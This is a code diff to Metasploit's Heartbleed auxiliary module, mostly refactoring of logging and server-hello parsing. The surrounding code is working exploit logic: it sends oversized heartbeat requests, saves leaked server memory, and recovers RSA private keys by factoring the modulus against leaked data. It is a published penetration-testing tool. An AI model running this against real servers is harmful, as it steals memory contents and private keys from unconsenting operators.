@@ -71,6 +71,7 @@ class Metasploit3 < Msf::Auxiliary
     0x00ff  # Unknown
   ]
 
+  SSL_RECORD_HEADER_SIZE            = 0x05
   HANDSHAKE_RECORD_TYPE             = 0x16
   HEARTBEAT_RECORD_TYPE             = 0x18
   ALERT_RECORD_TYPE                 = 0x15
@@ -78,7 +79,6 @@ class Metasploit3 < Msf::Auxiliary
   HANDSHAKE_CERTIFICATE_TYPE        = 0x0b
   HANDSHAKE_KEY_EXCHANGE_TYPE       = 0x0c
   HANDSHAKE_SERVER_HELLO_DONE_TYPE  = 0x0e
-
 
   TLS_VERSION = {
     'SSLv3' => 0x0300,
@@ -98,6 +98,9 @@ class Metasploit3 < Msf::Auxiliary
 
   # See the discussion at https://github.com/rapid7/metasploit-framework/pull/3252
   SAFE_CHECK_MAX_RECORD_LENGTH = (1 << 14)
+
+  # For verbose output, deduplicate repeated characters beyond this threshold
+  DEDUP_REPEATED_CHARS_THRESHOLD = 400
 
   def initialize
     super(
@@ -167,10 +170,6 @@ class Metasploit3 < Msf::Auxiliary
 
   end
 
-  def peer
-    "#{rhost}:#{rport}"
-  end
-
   #
   # Main methods
   #
@@ -178,7 +177,7 @@ class Metasploit3 < Msf::Auxiliary
   # Called when using check
   def check_host(ip)
     @check_only = true
-    vprint_status "#{peer} - Checking for Heartbleed exposure"
+    vprint_status "Checking for Heartbleed exposure"
     if bleed
       Exploit::CheckCode::Appears
     else
@@ -203,18 +202,13 @@ class Metasploit3 < Msf::Auxiliary
 
   # Main method
   def run_host(ip)
-    # initial connect to get public key and stuff
-    connect_result = establish_connect
-    disconnect
-    return if connect_result.nil?
-
     case action.name
       when 'SCAN'
         loot_and_report(bleed)
       when 'DUMP'
         loot_and_report(bleed)  # Scan & Dump are similar, scan() records results
       when 'KEYS'
-        getkeys
+        get_keys
       else
         # Shouldn't get here, since Action is Enum
         print_error("Unknown Action: #{action.name}")
@@ -345,13 +339,13 @@ class Metasploit3 < Msf::Auxiliary
       if jabber_host && jabber_host[1]
         disconnect
         establish_connect
-        vprint_status("#{peer} - Connecting with autodetected remote XMPP hostname: #{jabber_host[1]}...")
+        vprint_status("Connecting with autodetected remote XMPP hostname: #{jabber_host[1]}...")
         sock.put(jabber_connect_msg(jabber_host[1]))
         res = get_data
       end
     end
     if res.nil? || res.include?('stream:error') || res !~ /<starttls xmlns=['"]urn:ietf:params:xml:ns:xmpp-tls['"]/
-      vprint_error("#{peer} - Jabber host unknown. Please try changing the XMPPDOMAIN option.") if res && res.include?('host-unknown')
+      vprint_error("Jabber host unknown. Please try changing the XMPPDOMAIN option.") if res && res.include?('host-unknown')
       return nil
     end
     msg = "<starttls xmlns='urn:ietf:params:xml:ns:xmpp-tls'/>"
@@ -370,7 +364,7 @@ class Metasploit3 < Msf::Auxiliary
     return nil if res.nil?
     if res !~ /^234/
       # res contains the error message
-      vprint_error("#{peer} - FTP error: #{res.strip}")
+      vprint_error("FTP error: #{res.strip}")
       return nil
     end
     res
@@ -414,30 +408,25 @@ class Metasploit3 < Msf::Auxiliary
     connect
 
     unless tls_callback == 'None'
-      vprint_status("#{peer} - Trying to start SSL via #{tls_callback}")
+      vprint_status("Trying to start SSL via #{tls_callback}")
       res = self.send(TLS_CALLBACKS[tls_callback])
       if res.nil?
-        vprint_error("#{peer} - STARTTLS failed...")
+        vprint_error("STARTTLS failed...")
         return nil
       end
     end
 
-    vprint_status("#{peer} - Sending Client Hello...")
+    vprint_status("Sending Client Hello...")
     sock.put(client_hello)
-    server_hello = get_data
-    unless server_hello
-      vprint_error("#{peer} - No Server Hello after #{response_timeout} seconds...")
+
+    server_resp = get_server_hello
+
+    if server_resp.nil?
+      vprint_error("Server Hello Not Found")
       return nil
     end
 
-    server_resp_parsed = parse_ssl_record(server_hello)
-
-    if server_resp_parsed.nil?
-      vprint_error("#{peer} - Server Hello Not Found")
-      return nil
-    end
-
-    server_resp_parsed
+    server_resp
   end
 
   # Generates a heartbeat request
@@ -453,11 +442,11 @@ class Metasploit3 < Msf::Auxiliary
     connect_result = establish_connect
     return if connect_result.nil?
 
-    vprint_status("#{peer} - Sending Heartbeat...")
+    vprint_status("Sending Heartbeat...")
     sock.put(heartbeat_request(heartbeat_length))
-    hdr = get_data(5)
+    hdr = get_data(SSL_RECORD_HEADER_SIZE)
     if hdr.nil? || hdr.empty?
-      vprint_error("#{peer} - No Heartbeat response...")
+      vprint_error("No Heartbeat response...")
       disconnect
       return
     end
@@ -481,19 +470,19 @@ class Metasploit3 < Msf::Auxiliary
       else
         msg = 'Unknown error'
       end
-      vprint_error("#{peer} - #{msg}")
+      vprint_error("#{msg}")
       disconnect
       return
     end
 
     unless type == HEARTBEAT_RECORD_TYPE && version == TLS_VERSION[tls_version]
-      vprint_error("#{peer} - Unexpected Heartbeat response header (#{to_hex_string(hdr)})")
+      vprint_error("Unexpected Heartbeat response header (#{to_hex_string(hdr)})")
       disconnect
       return
     end
 
     heartbeat_data = get_data(heartbeat_length)
-    vprint_status("#{peer} - Heartbeat response, #{heartbeat_data.length} bytes")
+    vprint_status("Heartbeat response, #{heartbeat_data.length} bytes")
     disconnect
     heartbeat_data
   end
@@ -502,11 +491,11 @@ class Metasploit3 < Msf::Auxiliary
   def loot_and_report(heartbeat_data)
 
     unless heartbeat_data
-      vprint_error("#{peer} - Looks like there isn't leaked information...")
+      vprint_error("Looks like there isn't leaked information...")
       return
     end
 
-    print_good("#{peer} - Heartbeat response with leak")
+    print_good("Heartbeat response with leak")
     report_vuln({
       :host => rhost,
       :port => rport,
@@ -530,37 +519,55 @@ class Metasploit3 < Msf::Auxiliary
         nil,
         'OpenSSL Heartbleed server memory'
       )
-      print_status("#{peer} - Heartbeat data stored in #{path}")
+      print_status("Heartbeat data stored in #{path}")
     end
 
-    vprint_status("#{peer} - Printable info leaked: #{heartbeat_data.gsub(/[^[:print:]]/, '')}")
+    # Convert non-printable characters to periods
+    printable_data = heartbeat_data.gsub(/[^[:print:]]/, '.')
+
+    # Keep this many duplicates as padding around the deduplication message
+    duplicate_pad = (DEDUP_REPEATED_CHARS_THRESHOLD / 3).round
+
+    # Remove duplicate characters
+    abbreviated_data = printable_data.gsub(/(.)\1{#{(DEDUP_REPEATED_CHARS_THRESHOLD - 1)},}/) do |s|
+      s[0, duplicate_pad] +
+      ' repeated ' + (s.length - (2 * duplicate_pad)).to_s + ' times ' +
+      s[-duplicate_pad, duplicate_pad]
+    end
+
+    # Show abbreviated data
+    vprint_status("Printable info leaked:\n#{abbreviated_data}")
 
   end
 
   #
-  # Keydumoing helper methods
+  # Keydumping helper methods
   #
 
   # Tries to retreive the private key
-  def getkeys
-    print_status("#{peer} - Scanning for private keys")
+  def get_keys
+    connect_result = establish_connect
+    disconnect
+    return if connect_result.nil?
+
+    print_status("Scanning for private keys")
     count = 0
 
-    print_status("#{peer} - Getting public key constants...")
+    print_status("Getting public key constants...")
     n, e = get_ne
 
     if n.nil? || e.nil?
-      print_error("#{peer} - Failed to get public key, aborting.")
+      print_error("Failed to get public key, aborting.")
     end
 
-    vprint_status("#{peer} - n: #{n}")
-    vprint_status("#{peer} - e: #{e}")
-    print_status("#{peer} - #{Time.now.getutc} - Starting.")
+    vprint_status("n: #{n}")
+    vprint_status("e: #{e}")
+    print_status("#{Time.now.getutc} - Starting.")
 
     max_keytries.times {
       # Loop up to MAX_KEYTRIES times, looking for keys
       if count % status_every == 0
-        print_status("#{peer} - #{Time.now.getutc} - Attempt #{count}...")
+        print_status("#{Time.now.getutc} - Attempt #{count}...")
       end
 
       bleedresult = bleed
@@ -570,7 +577,7 @@ class Metasploit3 < Msf::Auxiliary
 
       unless p.nil? || q.nil?
         key = key_from_pqe(p, q, e)
-        print_good("#{peer} - #{Time.now.getutc} - Got the private key")
+        print_good("#{Time.now.getutc} - Got the private key")
 
         print_status(key.export)
         path = store_loot(
@@ -581,18 +588,18 @@ class Metasploit3 < Msf::Auxiliary
           nil,
           'OpenSSL Heartbleed Private Key'
         )
-        print_status("#{peer} - Private key stored in #{path}")
+        print_status("Private key stored in #{path}")
         return
       end
       count += 1
     }
-    print_error("#{peer} - Private key not found. You can try to increase MAX_KEYTRIES and/or HEARTBEAT_LENGTH.")
+    print_error("Private key not found. You can try to increase MAX_KEYTRIES and/or HEARTBEAT_LENGTH.")
   end
 
   # Returns the N and E params from the public server certificate
   def get_ne
     unless @cert
-      print_error("#{peer} - No certificate found")
+      print_error("No certificate found")
       return
     end
 
@@ -612,7 +619,7 @@ class Metasploit3 < Msf::Auxiliary
         # Only try candidates that have a chance...
         q, rem = n / can
         if rem == 0 && can != n
-          vprint_good("#{peer} - Found factor at offset #{x.to_s(16)}")
+          vprint_good("Found factor at offset #{x.to_s(16)}")
           p = can
           return p, q
         end
@@ -681,11 +688,32 @@ class Metasploit3 < Msf::Auxiliary
     ssl_record(HANDSHAKE_RECORD_TYPE, data)
   end
 
-  # Parse SSL header
-  def parse_ssl_record(data)
-    ssl_records = []
-    remaining_data = data
+  def get_ssl_record
+    hdr = get_data(SSL_RECORD_HEADER_SIZE)
+
+    unless hdr
+      vprint_error("No SSL record header received after #{response_timeout} seconds...")
+      return nil
+    end
+
+    len = hdr.unpack('Cnn')[2]
+    data = get_data(len)
+
+    unless data
+      vprint_error("No SSL record contents received after #{response_timeout} seconds...")
+      return nil
+    end
+
+    hdr << data
+  end
+
+  # Get and parse server hello response until we hit Server Hello Done or timeout
+  def get_server_hello
+    server_done = nil
     ssl_record_counter = 0
+
+    remaining_data = get_ssl_record
+
     while remaining_data && remaining_data.length > 0
       ssl_record_counter += 1
       ssl_unpacked = remaining_data.unpack('CH4n')
@@ -702,17 +730,19 @@ class Metasploit3 < Msf::Auxiliary
       else
         ssl_data = remaining_data[5, ssl_len]
         handshakes = parse_handshakes(ssl_data)
-        ssl_records << {
-            :type => ssl_type,
-            :version => ssl_version,
-            :length => ssl_len,
-            :data => handshakes
-        }
+
+        # Stop once we receive a SERVER_HELLO_DONE
+        if handshakes && handshakes.length > 0 && handshakes[-1][:type] == HANDSHAKE_SERVER_HELLO_DONE_TYPE
+          server_done = true
+          break
+        end
+
       end
-      remaining_data = remaining_data[(ssl_len + 5)..-1]
+
+      remaining_data = get_ssl_record
     end
 
-    ssl_records
+    server_done
   end
 
   # Parse Handshake data returned from servers
